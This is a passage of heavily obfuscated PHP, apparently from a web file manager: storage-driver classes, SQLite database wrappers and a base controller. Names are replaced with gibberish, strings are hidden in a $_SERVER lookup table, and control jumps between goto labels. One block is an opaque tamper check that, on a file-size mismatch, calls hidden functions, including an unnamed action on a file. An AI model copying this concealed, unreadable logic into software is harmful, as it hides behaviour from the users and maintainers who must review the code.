$this->model->pathInfoMore($ö·Ó³); } public function infoFullSimple($ŸÔ…ÕÁ¼) { $È¬Şò“ =& $_SERVER[äô®•½Â]; $•ùÏäòÆ = explode($È¬Şò“[8], $ŸÔ…ÕÁ¼); $¿·ûÏ·ì = implode($È¬Şò“[8], array_splice($•ùÏäòÆ, 1)); return $this->model->pathInfoByPath($•ùÏäòÆ[0], $¿·ûÏ·ì); } public function infoFull($ÛâÛß±Ã) { $âàà††è = $this->infoFullSimple($ÛâÛß±Ã); return is_array($âàà††è) ? $this->model->pathInfo($âàà††è[$_SERVER[äô®•½Â][194]]) : !1; } public function hashSimple($ÜÚÚ¯éĞ) { $“…öã‹ƒ =& $_SERVER[äô®•½Â]; $şûÕÅ = $this->infoWithChildren($ÜÚÚ¯éĞ); return $şûÕÅ[$“…öã‹ƒ[170]][$“…öã‹ƒ[688]]; } public function hashMd5($ã„Ì¹½) { $Ûå®öÏ´ =& $_SERVER[äô®•½Â]; $ãÂ’€‚õ = $this->infoWithChildren($ã„Ì¹½); return $ãÂ’€‚õ[$Ûå®öÏ´[170]][$Ûå®öÏ´[560]]; } public function exist($³èĞíğ) { $Û÷ò”å§ =& $_SERVER[äô®•½Â]; $ƒ™ˆ Æâ = $this->parse($³èĞíğ); if (!$ƒ™ˆ Æâ[$Û÷ò”å§[87]]) { return $this->isFile($³èĞíğ) || $this->isFolder($³èĞíğ); } $‚æüÉğì = array($Û÷ò”å§[488] => $ƒ™ˆ Æâ[$Û÷ò”å§[486]], $Û÷ò”å§[32] => $ƒ™ˆ Æâ[$Û÷ò”å§[87]]); $…­­¯Æ = $this->model->where($‚æüÉğì)->find(); return $…­­¯Æ ? !0 : !1; } public function isFile($„öÎ•ç‰) { $ãò¨¦½› =& $_SERVER[äô®•½Â]; $àïÍ¼Ö˜ = $this->infoSimple($„öÎ•ç‰); return $àïÍ¼Ö˜ && $àïÍ¼Ö˜[$ãò¨¦½›[496]] == $ãò¨¦½›[231] ? !0 : !1; } public function isFolder($ºšÛĞ¨) { $³ÂÛ×µÉ =& $_SERVER[äô®•½Â]; $ª¤¡ıŒ = $this->infoSimple($ºšÛĞ¨); return $ª¤¡ıŒ && $ª¤¡ıŒ[$³ÂÛ×µÉ[496]] == $³ÂÛ×µÉ[91] ? !0 : !1; } public function listPath($°û¯ëÄå, $·ó¸­‡³ = false) { $Ú”æÁ =& $_SERVER[äô®•½Â]; if ($°û¯ëÄå == $Ú”æÁ[12]) { return !1; } $©Ã«»ï° = array($Ú”æÁ[488] => $°û¯ëÄå); if ($·ó¸­‡³) { return $this->model->listSource($©Ã«»ï°, -1); } return $this->model->listSource($©Ã«»ï°); } public function has($İåŞõ¤ï, $ÛíÓ£Ü = false, $ñ‚îÁóÎ = null) { $Û¶øáĞÇ =& $_SERVER[äô®•½Â]; $øñ‚£Ä– = $this->infoWithChildren($İåŞõ¤ï); if ($ÛíÓ£Ü) { return array($Û¶øáĞÇ[243] => $øñ‚£Ä–[$Û¶øáĞÇ[243]], $Û¶øáĞÇ[242] => $øñ‚£Ä–[$Û¶øáĞÇ[242]]); } return $ñ‚îÁóÎ ? $øñ‚£Ä–[$Û¶øáĞÇ[243]] : $øñ‚£Ä–[$Û¶øáĞÇ[242]]; } public function listAll($ã®ø…ôÔ) { $™†û¼´ğ = IO::info($this->pathParse[$_SERVER[äô®•½Â][87]]); if (!$™†û¼´ğ) { return array(); } return $this->model->listAll($ã®ø…ôÔ); } public function getContent($•ƒ÷äé) { return $this->model->getContent($•ƒ÷äé); } public function setContent($¦íŞ î¯, $íæ‰îŠ¥ = '') { return $this->model->setContent($¦íŞ î¯, $íæ‰îŠ¥); } public function fileSubstr($“ùçÏ¿­, $ÓÆÏ‰Ñ¤, $¬’áİÚ×) { return $this->model->fileSubstr($“ùçÏ¿­, $ÓÆÏ‰Ñ¤, $¬’áİÚ×); } public function download($™íŒ÷Ã, $üü‡…Œğ = '') { $ğ¤ïñè‡ = get_path_father($üü‡…Œğ); $¥ºîÔ¾ = get_path_this($üü‡…Œğ); $‡­ùÃŒ… = $this->model->fileInfoGet($™íŒ÷Ã); $ß–·Ã×» = IO::copy($‡­ùÃŒ…[$_SERVER[äô®•½Â][87]], $ğ¤ïñè‡, !1, $¥ºîÔ¾); return $ß–·Ã×»; } public function setModifyTime($ù´İËƒä, $ÓµìôÅû = '') { $‘å´ÒÑ =& $_SERVER[äô®•½Â]; if (!$ù´İËƒä) { return; } $this->model->where(array($‘å´ÒÑ[502] => $ù´İËƒä))->save(array($‘å´ÒÑ[88] => $ÓµìôÅû)); } public function upload($ÄÃıÓ—³, $¨½šÑ…Å, $œ†¦µ³Û = false, $à¼¤úàÃ = REPEAT_REPLACE) { $‹À„Å’© =& $_SERVER[äô®•½Â]; $èÃäÄÜ± = $this->parse($ÄÃıÓ—³); $îÆ…ŒäÛ = $this->model->addFile($èÃäÄÜ±[$‹À„Å’©[486]], $¨½šÑ…Å, $èÃäÄÜ±[$‹À„Å’©[87]], $œ†¦µ³Û, $à¼¤úàÃ); return $this->getPathOuter($îÆ…ŒäÛ); } public function uploadFileByID($¯¡Ü™È¶, $¾å­ĞÉ, $¨»Š£È) { $Ã·ø¨•¤ =& $_SERVER[äô®•½Â]; $œ‡²°Ñé = $this->parse($¯¡Ü™È¶); $¡÷â‡¿ƒ = $this->model->addFileByFileID($œ‡²°Ñé[$Ã·ø¨•¤[486]], $¾å­ĞÉ, $œ‡²°Ñé[$Ã·ø¨•¤[87]], $¨»Š£È); return $this->getPathOuter($¡÷â‡¿ƒ); } public function addFileByRemote($î¶£êª‘, $­‘ù–, $Ä‰œ†òÄ = array(), $œ¸í»ÕØ = '', $à—Ê­¨) { $Ü»ÈêÔ° =& $_SERVER[äô®•½Â]; $ƒƒ«·ºù = $this->parse($î¶£êª‘); $œ¸í»ÕØ = empty($œ¸í»ÕØ) ? $ƒƒ«·ºù[$Ü»ÈêÔ°[87]] : $œ¸í»ÕØ; $˜ì ãÇ = $this->model->addFileByRemote($ƒƒ«·ºù[$Ü»ÈêÔ°[486]], $­‘ù–, $œ¸í»ÕØ, $Ä‰œ†òÄ, $à—Ê­¨); return $this->getPathOuter($˜ì ãÇ); } public function uploadLink($ì‹èÍ’Â, $¦Ãß×ó× = 0) { $ş«úëÌª =& $_SERVER[äô®•½Â]; $ê”ï®ŒÍ = $this->parse($ì‹èÍ’Â); $ÓØ··÷‰ = _get($GLOBALS[$ş«úëÌª[7]], $ş«úëÌª[1428]); $´®Üµß© = _get($GLOBALS[$ş«úëÌª[7]], $ş«úëÌª[1429]); $¼«¥•ŠÛ = KodIO::ioFileDriverGet($ş«úëÌª[494] . $ê”ï®ŒÍ[$ş«úëÌª[486]] . $ş«úëÌª[413]); $•»‹ ¤— = Model($ş«úëÌª[690])->createFileName($ê”ï®ŒÍ[$ş«úëÌª[87]], $¼«¥•ŠÛ, $ÓØ··÷‰, $´®Üµß©); return IO::uploadLink($•»‹ ¤—, $¦Ãß×ó×); } public function fileNameAuto($®â‹¯‡, $¨ŸÇé‹, $»÷ÃÑ£â = REPEAT_REPLACE, $ÅÕÙÉÀ† = false) { return $this->model->fileNameAuto($®â‹¯‡, $¨ŸÇé‹, $»÷ÃÑ£â, $ÅÕÙÉÀ†); } public function fileNameExist($ØŠ±ºµ·, $‹¶‘Ñ) { return $this->model->fileNameExist($ØŠ±ºµ·, $‹¶‘Ñ); } protected function _fileOut($³ï¨‰×·, $Í×°‹œğ = false, $¯õ¸Ô–Å = false, $úÛ­ª°” = '', $Ê€ÅŠû = false) { $±ã£¸ƒ =& $_SERVER[äô®•½Â]; $ŒøÄ°ºê = $this->model->sourceInfo($³ï¨‰×·); if ($ŒøÄ°ºê[$±ã£¸ƒ[496]] == $±ã£¸ƒ[91]) { header($±ã£¸ƒ[1430]); die; } $ºŒâ‚© = $this->model->fileInfoGet($³ï¨‰×·); $úÛ­ª°” = $ºŒâ‚©[$±ã£¸ƒ[560]] ? $ºŒâ‚©[$±ã£¸ƒ[560]] : $úÛ­ª°”; $…Ÿûûß = isset($GLOBALS[$±ã£¸ƒ[183]]) && is_array($GLOBALS[$±ã£¸ƒ[183]]) ? $GLOBALS[$±ã£¸ƒ[183]][$±ã£¸ƒ[32]] : $ŒøÄ°ºê[$±ã£¸ƒ[32]]; if ($Ê€ÅŠû) { return IO::fileOutServer($ºŒâ‚©[$±ã£¸ƒ[87]], $Í×°‹œğ, $…Ÿûûß, $úÛ­ª°”); } IO::fileOut($ºŒâ‚©[$±ã£¸ƒ[87]], $Í×°‹œğ, $…Ÿûûß, $úÛ­ª°”); } public function fileOut($ÑşŒıÅÊ, $•¥íã¡¢ = false, $ù“üûŸ» = false, $Ğú™µÅ› = '') { $this->_fileOut($ÑşŒıÅÊ, $•¥íã¡¢, $ù“üûŸ», $Ğú™µÅ›); } public function fileOutServer($ğ‡…ëÙÔ, $‡¾õˆÇÇ = false, $Ñ¼õ ì = false, $¡Æ³ğ‘ = '') { $this->_fileOut($ğ‡…ëÙÔ, $‡¾õˆÇÇ, $Ñ¼õ ì, $¡Æ³ğ‘, !0); } protected function _fileOutImage($¹â¹ãç, $ÔÔ¿Ğ = 250) { $ëäì–™¡ =& $_SERVER[äô®•½Â]; $Ø„‹¢ú = $this->model->pathInfo($¹â¹ãç); if ($Ø„‹¢ú[$ëäì–™¡[496]] == $ëäì–™¡[91]) { show_json($ëäì–™¡[1431] . $¹â¹ãç, !1); } $ÉÁ”Àåâ = $this->model->fileInfoGet($¹â¹ãç); $Ø„‹¢ú[$ëäì–™¡[184]] = $ÉÁ”Àåâ[$ëäì–™¡[87]]; $GLOBALS[$ëäì–™¡[183]] = $Ø„‹¢ú; IO::fileOutImage($ÉÁ”Àåâ[$ëäì–™¡[87]], $ÔÔ¿Ğ); } public function fileOutImage($óÕàÇÚ, $±×½ú‡ = 250) { $this->_fileOutImage($óÕàÇÚ, $±×½ú‡); } public function fileOutImageServer($˜ÙêÛ˜´, $†°ëòŸ† = 250) { $this->_fileOutImage($˜ÙêÛ˜´, $†°ëòŸ†); } public function link($…÷¿®ù†, $´¬ŒÉ“¢ = '') { $¿¶ÓÓÒÈ = $this->model->fileInfoGet($…÷¿®ù†); return IO::link($¿¶ÓÓÒÈ[$_SERVER[äô®•½Â][87]], $´¬ŒÉ“¢); } protected function parse($Û¨ƒï¨à) { $ì˜¥Á¹ =& $_SERVER[äô®•½Â]; if (strstr($Û¨ƒï¨à, $ì˜¥Á¹[8]) === !1) { return array($ì˜¥Á¹[504] => intval($Û¨ƒï¨à), $ì˜¥Á¹[87] => $ì˜¥Á¹[12], $ì˜¥Á¹[1427] => array()); } $§Ã¨¦­ò = explode($ì˜¥Á¹[8], trim($Û¨ƒï¨à, $ì˜¥Á¹[8])); if (count($§Ã¨¦­ò) < 2) { show_tips(clear_html($Û¨ƒï¨à) . $ì˜¥Á¹[1432]); } return array($ì˜¥Á¹[504] => intval($§Ã¨¦­ò[0]), $ì˜¥Á¹[87] => $§Ã¨¦­ò[1], $ì˜¥Á¹[1427] => array_slice($§Ã¨¦­ò, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($×÷Ö­› ) { $this->pathParse = $×÷Ö­› ; $this->model = Model($_SERVER[äô®•½Â][1426]); } public function getPathOuter($›ÓıÏÖ) { $ü‰û¬İ =& $_SERVER[äô®•½Â]; if (!$›ÓıÏÖ) { return $›ÓıÏÖ; } $Ì¸Şé’ä = $this->parse($›ÓıÏÖ); return trim(KodIO::makeShare($this->pathParse[$ü‰û¬İ[486]], $Ì¸Şé’ä[$ü‰û¬İ[486]]), $ü‰û¬İ[8]); } protected function infoParse($¬¨£ñá›, $üÀÁ™™ò = false, $Ïïì’¹” = false) { $è©ºİ =& $_SERVER[äô®•½Â]; $¥ÛÄ‘» = $this->pathParse[$è©ºİ[486]]; $ÖÔ“–µï = trim($this->pathParse[$è©ºİ[1247]], $è©ºİ[8]); return Action($è©ºİ[1433])->sharePathInfo($¥ÛÄ‘», $ÖÔ“–µï, $üÀÁ™™ò); } public function infoFull($©¦Íø¢å) { $ş®Ü‰™ =& $_SERVER[äô®•½Â]; $»²‹¦ö½ = explode($ş®Ü‰™[8], trim($©¦Íø¢å, $ş®Ü‰™[8])); if (count($»²‹¦ö½) > 1) { $‡¼¿šñ” = implode($ş®Ü‰™[8], array_splice($»²‹¦ö½, 1)); $Í­ü¤õ’ = $this->model->pathInfoByPath($»²‹¦ö½[0], $‡¼¿šñ”); if (!$Í­ü¤õ’) { return !1; } $this->pathParse[$ş®Ü‰™[1247]] = $Í­ü¤õ’[$ş®Ü‰™[194]]; } return $this->infoParse($©¦Íø¢å); } public function listAll($—Œ©Ò·) { $ÅÌ‘¶ä± =& $_SERVER[äô®•½Â]; $ˆÆ¨µÓš = IO::info($this->pathParse[$ÅÌ‘¶ä±[87]]); if (!$ˆÆ¨µÓš) { return array(); } $‰Å‹˜ÌÎ = $this->model->listAll($—Œ©Ò·); $˜£ñ¥®Õ = Model($ÅÌ‘¶ä±[680])->getInfo($ˆÆ¨µÓš[$ÅÌ‘¶ä±[681]]); foreach ($‰Å‹˜ÌÎ as &$•…×˜”) { check_abort(); $•…×˜”[$ÅÌ‘¶ä±[90]] = Action($ÅÌ‘¶ä±[1433])->_shareItemeParse($•…×˜”[$ÅÌ‘¶ä±[90]], $˜£ñ¥®Õ); } unset($•…×˜”); return $‰Å‹˜ÌÎ; } } goto Câğ¶áÂ¸; D»‰÷ °: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $½“ÉÄ¬İ =& $_SERVER[äô®•½Â]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$½“ÉÄ¬İ[6]] =& $config; $this->values[$½“ÉÄ¬İ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $½“ÉÄ¬İ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($°ïË°Ôä) { if (1 === func_num_args()) { $this->{$°ïË°Ôä} = new $°ïË°Ôä(); } else { $Õ®ÏÃ“í = new ReflectionClass($°ïË°Ôä); $—¹£Ûõ = func_get_args(); array_shift($—¹£Ûõ); $this->{$°ïË°Ôä} = $Õ®ÏÃ“í->newInstanceArgs($—¹£Ûõ); } return $this->{$°ïË°Ôä}; } public function routeBind($Œˆµ¬ºª, $ã££ú”–, $³ÊÕÆ”Æ = 3) { $›ÅïÔş‚ =& $_SERVER[äô®•½Â]; $—ŒÑ”¾ı = $this->in[$›ÅïÔş‚[9]]; $Œˆµ¬ºª = str_replace($›ÅïÔş‚[10], $›ÅïÔş‚[11], trim(trim($Œˆµ¬ºª, $›ÅïÔş‚[8]), $›ÅïÔş‚[12])); if (!$Œˆµ¬ºª || count($—ŒÑ”¾ı) <= $³ÊÕÆ”Æ) { return !1; } $Ä»ª“æ = !0; $üåè­Š = explode($›ÅïÔş‚[8], $Œˆµ¬ºª); for ($Œ¾í“è„ = 0; $Œ¾í“è„ < count($üåè­Š); $Œ¾í“è„++) { if ($üåè­Š[$Œ¾í“è„] != $—ŒÑ”¾ı[$³ÊÕÆ”Æ + $Œ¾í“è„]) { $Ä»ª“æ = !1; break; } } if (!$Ä»ª“æ) { return; } call_user_func_array(array($this, $ã££ú”–), array()); } public function routeArgs($Ì¶®¸õ = 3) { $„¨Å˜àƒ = $this->in[$_SERVER[äô®•½Â][9]]; if (count($„¨Å˜àƒ) <= $Ì¶®¸õ) { return array(); } $«š²Û¥ = array(); for ($øç™û©Ì = $Ì¶®¸õ; $øç™û©Ì < count($„¨Å˜àƒ); $øç™û©Ì += 2) { $«š²Û¥[$„¨Å˜àƒ[$øç™û©Ì]] = $„¨Å˜àƒ[$øç™û©Ì + 1]; $this->in[$„¨Å˜àƒ[$øç™û©Ì]] = $„¨Å˜àƒ[$øç™û©Ì + 1]; } return $«š²Û¥; } protected function assign($µæÂ‹Åğ, $ù­õ¸¡Ğ) { $this->values[$µæÂ‹Åğ] = $ù­õ¸¡Ğ; } protected function display($Œ˜áÃ×) { ob_end_clean(); extract($this->values); require $this->tpl . $Œ˜áÃ×; } } class DbSqliteBase extends Db { public function __construct($Áò’ŒĞæ = '') { $Óœ¢äñÄ =& $_SERVER[äô®•½Â]; if (!extension_loaded($Óœ¢äñÄ[13])) { think_exception(think_lang($Óœ¢äñÄ[14]) . $Óœ¢äñÄ[15]); } if (!empty($Áò’ŒĞæ)) { if (!isset($Áò’ŒĞæ[$Óœ¢äñÄ[16]])) { $Áò’ŒĞæ[$Óœ¢äñÄ[16]] = 438; } $this->config = $Áò’ŒĞæ; if (empty($this->config[$Óœ¢äñÄ[17]])) { $this->config[$Óœ¢äñÄ[17]] = array(); } } } public function connect($Ô÷ò»õ = '', $ÉÔ«Ó‰ = 0) { $âßœøôÙ =& $_SERVER[äô®•½Â]; if (!isset($this->linkID[$ÉÔ«Ó‰])) { if (empty($Ô÷ò»õ)) { $Ô÷ò»õ = $this->config; } $òÕ™çÏ = !empty($Ô÷ò»õ[$âßœøôÙ[17]][$âßœøôÙ[18]]) ? $Ô÷ò»õ[$âßœøôÙ[17]][$âßœøôÙ[18]] : $this->pconnect; $ö˜§¬ = $òÕ™çÏ ? $âßœøôÙ[19] : $âßœøôÙ[20]; $this->linkID[$ÉÔ«Ó‰] = $ö˜§¬($Ô÷ò»õ[$âßœøôÙ[21]], $Ô÷ò»õ[$âßœøôÙ[16]]); if (!$this->linkID[$ÉÔ«Ó‰]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ÉÔ«Ó‰], 30000); if (1 != think_config($âßœøôÙ[22])) { unset($this->config); } } return $this->linkID[$ÉÔ«Ó‰]; } public function free() { $this->queryID = null; } public function query($±à¢×÷¾) { $É–â—Œğ =& $_SERVER[äô®•½Â]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±à¢×÷¾; if ($this->queryID) { $this->free(); } think_action_status($É–â—Œğ[23], 1); think_status($É–â—Œğ[24]); $this->queryID = sqlite_query($this->_linkID, $±à¢×÷¾); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ØÌ±¹ùç = $this->getAll(); return $ØÌ±¹ùç; } } public function execute($©²‰¶ËÙ) { $ì»ÆÔ¥ =& $_SERVER[äô®•½Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©²‰¶ËÙ; if ($this->queryID) { $this->free(); } think_action_status($ì»ÆÔ¥[25], 1); think_status($ì»ÆÔ¥[24]); $ü–®­© = sqlite_exec($this->_linkID, $©²‰¶ËÙ); $this->debug(); if (!1 === $ü–®­©) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[äô®•½Â][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ê¨˜¯Í© = sqlite_query($this->_linkID, $_SERVER[äô®•½Â][27]); if (!$Ê¨˜¯Í©) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ñİŠø¨ = sqlite_query($this->_linkID, $_SERVER[äô®•½Â][28]); if (!$ñİŠø¨) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Õõ×çËê = array(); if ($this->numRows > 0) { for ($ûñê×®› = 0; $ûñê×®› < $this->numRows; $ûñê×®›++) { $Õõ×çËê[$ûñê×®›] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Õõ×çËê; } public function getFields($äÈ˜ñ²) { $ìºœî·¼ =& $_SERVER[äô®•½Â]; $°ÈÛëÌ® = $this->query($ìºœî·¼[29] . $äÈ˜ñ² . $ìºœî·¼[30]); $ÑàÁÔÓÚ = array(); if ($°ÈÛëÌ®) { foreach ($°ÈÛëÌ® as $ÅÁ®æ‡Ó => $ÑÍ„¾áï) { $ÑàÁÔÓÚ[$ÑÍ„¾áï[$ìºœî·¼[31]]] = array($ìºœî·¼[32] => $ÑÍ„¾áï[$ìºœî·¼[31]], $ìºœî·¼[33] => $ÑÍ„¾áï[$ìºœî·¼[34]], $ìºœî·¼[35] => (bool) ($ÑÍ„¾áï[$ìºœî·¼[36]] === $ìºœî·¼[12]), $ìºœî·¼[37] => $ÑÍ„¾áï[$ìºœî·¼[38]], $ìºœî·¼[39] => strtolower($ÑÍ„¾áï[$ìºœî·¼[40]]) == $ìºœî·¼[41], $ìºœî·¼[42] => strtolower($ÑÍ„¾áï[$ìºœî·¼[43]]) == $ìºœî·¼[44]); } } return $ÑàÁÔÓÚ; } public function getTables($é©òÛüú = '') { $ò³±»ÖÌ =& $_SERVER[äô®•½Â]; $úÓï±ºá = $this->query($ò³±»ÖÌ[45] . $ò³±»ÖÌ[46] . $ò³±»ÖÌ[47]); $Èó¥À—Ì = array(); foreach ($úÓï±ºá as $©ÌÈóŸ => $áşô¥­œ) { $Èó¥À—Ì[$©ÌÈóŸ] = current($áşô¥­œ); } return $Èó¥À—Ì; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $‚²ˆÕµŸ =& $_SERVER[äô®•½Â]; $üê˜¯ûî = sqlite_last_error($this->_linkID); $this->error = $üê˜¯ûî . $‚²ˆÕµŸ[4] . sqlite_error_string($üê˜¯ûî); if ($‚²ˆÕµŸ[12] != $this->queryStr) { $this->error .= LNG($‚²ˆÕµŸ[48]) . $this->queryStr; } think_trace($this->error, $‚²ˆÕµŸ[12], $‚²ˆÕµŸ[49]); return $this->error; } public function escapeString($ã·ææÜÁ) { return sqlite_escape_string($ã·ææÜÁ); } public function parseLimit($…” ş‡‘) { $…Í’²â =& $_SERVER[äô®•½Â]; $¿øïöù = $…Í’²â[12]; if (!empty($…” ş‡‘)) { $…” ş‡‘ = explode($…Í’²â[50], $…” ş‡‘); if (count($…” ş‡‘) > 1) { $¿øïöù .= $…Í’²â[51] . $…” ş‡‘[1] . $…Í’²â[52] . $…” ş‡‘[0] . $…Í’²â[53]; } else { $¿øïöù .= $…Í’²â[51] . $…” ş‡‘[0] . $…Í’²â[53]; } } return $¿øïöù; } } class DbSqlite3Base extends Db { public function __construct($óÁ¨‹ãÒ = '') { $çÉÛ’‹ş =& $_SERVER[äô®•½Â]; if (!class_exists($çÉÛ’‹ş[54])) { think_exception(think_lang($çÉÛ’‹ş[14]) . $çÉÛ’‹ş[55]); } if (!empty($óÁ¨‹ãÒ)) { if (!isset($óÁ¨‹ãÒ[$çÉÛ’‹ş[16]])) { $óÁ¨‹ãÒ[$çÉÛ’‹ş[16]] = 438; } $this->config = $óÁ¨‹ãÒ; if (empty($this->config[$çÉÛ’‹ş[17]])) { $this->config[$çÉÛ’‹ş[17]] = array(); } } } public function connect($œ›õõ“ = '', $éàú…£Ê = 0) { $»±ôœâ– =& $_SERVER[äô®•½Â]; if (!isset($this->linkID[$éàú…£Ê])) { if (empty($œ›õõ“)) { $œ›õõ“ = $this->config; } $this->linkID[$éàú…£Ê] = new SQLite3($œ›õõ“[$»±ôœâ–[21]]); if (!$this->linkID[$éàú…£Ê]) { think_exception($this->linkID[$éàú…£Ê]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$éàú…£Ê]->busyTimeout(30000); if (1 != think_config($»±ôœâ–[22])) { unset($this->config); } } return $this->linkID[$éàú…£Ê]; } public function free() { $this->queryID = null; } public function query($‡“Ì‘ä¦) { $±ñÉ˜Œ =& $_SERVER[äô®•½Â]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‡“Ì‘ä¦; if ($this->queryID) { $this->free(); } think_action_status($±ñÉ˜Œ[23], 1); think_status($±ñÉ˜Œ[24]); $this->queryID = $this->_linkID->query($‡“Ì‘ä¦); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $‡°–°ß = $this->getAll(); $this->numRows = count($‡°–°ß); return $‡°–°ß; } } public function execute($ö¿‘¼Şë) { $Ô‰çŞ¼† =& $_SERVER[äô®•½Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ö¿‘¼Şë; if ($this->queryID) { $this->free(); } think_action_status($Ô‰çŞ¼†[25], 1); think_status($Ô‰çŞ¼†[24]); $‹±ıÁ¼ = $this->_linkID->exec($ö¿‘¼Şë); $this->debug(); if (!1 === $‹±ıÁ¼) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[äô®•½Â][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¨À ëï = $this->_linkID->query($_SERVER[äô®•½Â][27]); if (!$¨À ëï) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÔÔé’¤Á = $this->_linkID->query($_SERVER[äô®•½Â][28]); if (!$ÔÔé’¤Á) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $äÄ…›— = array(); while ($÷ÀıÄÄ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $äÄ…›—[] = $÷ÀıÄÄ; } $this->queryID->reset(); return $äÄ…›—; } public function getFields($ßŞ°­Šì) { $¹Ë—àÑ =& $_SERVER[äô®•½Â]; $²ÊŞõØş = $this->query($¹Ë—àÑ[29] . $ßŞ°­Šì . $¹Ë—àÑ[30]); $Ø¡Œ™™ú = array(); if ($²ÊŞõØş) { foreach ($²ÊŞõØş as $òƒ²º®¿ => $¯Â”ÆÙ•) { $Ø¡Œ™™ú[$¯Â”ÆÙ•[$¹Ë—àÑ[32]]] = array($¹Ë—àÑ[32] => $¯Â”ÆÙ•[$¹Ë—àÑ[32]], $¹Ë—àÑ[33] => $¯Â”ÆÙ•[$¹Ë—àÑ[33]], $¹Ë—àÑ[35] => (bool) ($¯Â”ÆÙ•[$¹Ë—àÑ[35]] === $¹Ë—àÑ[12]), $¹Ë—àÑ[37] => $¯Â”ÆÙ•[$¹Ë—àÑ[56]], $¹Ë—àÑ[39] => (bool) $¯Â”ÆÙ•[$¹Ë—àÑ[57]], $¹Ë—àÑ[42] => (bool) $¯Â”ÆÙ•[$¹Ë—àÑ[57]]); } } return $Ø¡Œ™™ú; } public function getTables($¢Èíß³ = '') { $İ¶ü‹Àä =& $_SERVER[äô®•½Â]; $»ÍœÇ¦µ = $this->query($İ¶ü‹Àä[45] . $İ¶ü‹Àä[46] . $İ¶ü‹Àä[47]); $ºùµ‡„¢ = array(); foreach ($»ÍœÇ¦µ as $ß ÌÁºß => $éîĞ§ì®) { $ºùµ‡„¢[$ß ÌÁºß] = current($éîĞ§ì®); } return $ºùµ‡„¢; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÆºÈÔŒ… =& $_SERVER[äô®•½Â]; $this->error = $this->_linkID->lastErrorMsg(); if ($ÆºÈÔŒ…[12] != $this->queryStr) { $this->error .= LNG($ÆºÈÔŒ…[48]) . $this->queryStr; } think_trace($this->error, $ÆºÈÔŒ…[12], $ÆºÈÔŒ…[49]); return $this->error; } public function escapeString($ˆ¾Ò½ş—) { $ÒÛõ©Èğ =& $_SERVER[äô®•½Â]; if ($this->_linkID) { return $this->_linkID->escapeString($ˆ¾Ò½ş—); } return str_ireplace($ÒÛõ©Èğ[58], $ÒÛõ©Èğ[59], $ˆ¾Ò½ş—); } public function parseLimit($ø›Ğ…¸) { $½ÕÅÃ¬ =& $_SERVER[äô®•½Â]; $½ä¹‘¨¯ = $½ÕÅÃ¬[12]; if (!empty($ø›Ğ…¸)) { $ø›Ğ…¸ = explode($½ÕÅÃ¬[50], $ø›Ğ…¸); if (count($ø›Ğ…¸) > 1) { $½ä¹‘¨¯ .= $½ÕÅÃ¬[51] . $ø›Ğ…¸[1] . $½ÕÅÃ¬[52] . $ø›Ğ…¸[0] . $½ÕÅÃ¬[53]; } else { $½ä¹‘¨¯ .= $½ÕÅÃ¬[51] . $ø›Ğ…¸[0] . $½ÕÅÃ¬[53]; } } return $½ä¹‘¨¯; } } goto BŒàØÉ÷®¸; Cõá¢áƒ©É: $_size = $_SERVER[äô®•½Â][949]; if ($_SERVER[$_SERVER[äô®•½Â][324]] != $_size($_file)) { $_getc = $_SERVER[äô®•½Â][326]; $_getfile = $_SERVER[$_SERVER[äô®•½Â][327]] . $_SERVER[äô®•½Â][328]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[äô®•½Â][288], $_getfilec); if (count($_getarrs) < $_SERVER[äô®•½Â][329]) { $exit = $_SERVER[äô®•½Â][330]; $exit(); } $_act = $_SERVER[äô®•½Â][331]; $_act($_file); } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ˆÛşßíâ) { parent::__construct($ˆÛşßíâ); $this->setSignVersion($_SERVER[äô®•½Â][250]); } public function fileOutImage($®˜ÆËĞ‹, $£Ì‡´Ï‡ = 250) { $¾ñÙˆ©‚ =& $_SERVER[äô®•½Â]; if ($this->size($®˜ÆËĞ‹) > 1024 * 1024 * 25) { return $this->fileOutImageServer($®˜ÆËĞ‹, $£Ì‡´Ï‡); } $ÙªÒ“¸´ = array($¾ñÙˆ©‚[1465] => $¾ñÙˆ©‚[1466] . $£Ì‡´Ï‡ . $¾ñÙˆ©‚[1467]); $—î¨–ûõ = $this->link($®˜ÆËĞ‹, $ÙªÒ“¸´); $this->fileOutLink($—î¨–ûõ); } } goto B¾çÍÉ¿çØ; 